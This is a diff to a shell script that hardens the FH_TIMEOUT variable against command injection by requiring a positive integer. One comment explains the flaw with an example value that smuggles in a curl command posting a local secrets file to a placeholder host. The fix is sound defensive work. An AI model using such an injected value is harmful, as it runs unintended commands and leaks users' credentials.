@@ -16,6 +16,7 @@ _TMPDIR="${TMPDIR:-/tmp}"
 
 FH_BACKEND="${FH_BACKEND:-auto}"
 FH_TIMEOUT="${FH_TIMEOUT:-180}"
+# Validated below, before it can reach command position via the unquoted ${_TIMEOUT_CMD}.
 FH_DRY_RUN="${FH_DRY_RUN:-0}"
 FH_VERBOSE="${FH_VERBOSE:-0}"
 FH_RUN_PROMPT="${FH_RUN_PROMPT:-}"
@@ -101,6 +102,16 @@ case "$FH_BACKEND" in
     exit 11
     ;;
 esac
+
+# FH_TIMEOUT reaches command position via the unquoted ${_TIMEOUT_CMD} idiom below, and
+# `timeout DURATION COMMAND [ARG]...` makes the word after the duration the command — so
+# word-splitting alone gives arbitrary execution, with no shell metacharacters involved
+# (FH_TIMEOUT="1 curl -sd @~/.config/secrets https://x"). FH_BACKEND is whitelisted and
+# FH_MODEL is quoted; this was the one env var on the path with neither.
+if ! [[ "$FH_TIMEOUT" =~ ^[0-9]+$ ]]; then
+  echo "ERROR: FH_TIMEOUT must be a positive integer (got: $FH_TIMEOUT)" >&2
+  exit 11
+fi
 
 if [[ "$FH_BACKEND" == "auto" ]]; then
   if command -v codex &>/dev/null; then
